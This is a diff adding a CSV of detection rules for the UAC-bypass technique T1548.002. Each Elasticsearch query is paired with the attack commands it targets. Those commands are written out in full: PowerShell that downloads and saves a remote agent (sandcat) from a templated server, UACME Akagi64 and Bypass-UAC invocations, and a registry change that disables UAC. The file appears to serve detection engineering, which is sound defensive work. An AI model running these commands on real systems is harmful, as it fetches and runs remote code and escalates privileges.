@@ -1,0 +1,97 @@
+﻿T1548.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            
+                             {""wildcard"":{""CommandLine"": ""*Headers""}},
+                              {""wildcard"":{""CommandLine"": ""*DownloadData""}},                      
+                            {""match"":{""CommandLine"": ""WriteAllBytes""}},
+                              {""match_phrase"":{""CommandLine"": ""sandcat.go""}},
+                               {""match_phrase"":{""CommandLine"": ""Receive-Job""}}
+                            
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$url=""#{server}/file/download"";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add(""platform"",""windows"");
+$wc.Headers.add(""file"",""sandcat.go"");
+$data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[""Content-Disposition""].Substring($wc.ResponseHeaders[""Content-Disposition""].IndexOf(""filename="")+9).Replace(""`"""",""""); [io.file]::WriteAllBytes(""C:\Users\Public\$name.exe"",$data);
+$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command ""C:\Users\Public\$name.exe -group #{group}""; };
+Receive-Job -Job $job -Wait;",2
+T1548.002,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""wildcard"":{""CommandLine"": ""Akagi64*""}},                 
+                            {""term"":{""CommandLine"": ""cmd.exe""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""45""}},
+                        {""match_phrase"": {""CommandLine"": ""30""}}
+                       
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",".\Akagi64.exe 45 C:\Windows\System32\cmd.exe
+
+.\Akagi64.exe 30 C:\Windows\System32\cmd.exe",
+T1548.002,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""New-ItemProperty -Path""}},
+                        {""match_phrase"":{""CommandLine"": ""Windows\\CurrentVersion\\policies\\system""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match"": {""CommandLine"": ""-PropertyType""}},
+                        {""match"": {""CommandLine"": ""-Name""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system 
+-Name EnableLUA -PropertyType DWord -Value 0 -Force",2
+T1548.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                    {""match_phrase"": {""CommandLine"": ""New-Object System.Net.WebClient""}},
+                    {""wildcard"": {""CommandLine"": ""*.Headers.add""}},
+                    {""wildcard"": {""CommandLine"": ""*.DownloadData""}},
+                    {""term"": {""CommandLine"": ""sandcat.go""}},
+                    {""wildcard"": {""CommandLine"": ""*.ResponseHeaders""}},
+                     {""wildcard"":{""CommandLine"": ""Akagi64*""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$url=""#{server}/file/download"";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add(""platform"",""windows"");
+$wc.Headers.add(""file"",""sandcat.go"");
+$wc.Headers.add(""server"",""#{server}"");
+$wc.Headers.add(""defaultSleep"",""60"");
+$wc.Headers.add(""defaultGroup"",""bypassed_u_bro"");
+$data=$wc.DownloadData($url);
+$name=$wc.ResponseHeaders[""Content-Disposition""].Substring($wc.ResponseHeaders[""Content-Disposition""].IndexOf(""filename="")+9).Replace(""`"""","""");
+[io.file]::WriteAllBytes(""C:\Users\Public\$name.exe"",$data);
+.\Akagi64.exe 32 ""C:\Users\Public\$name.exe -server #{server}""",2
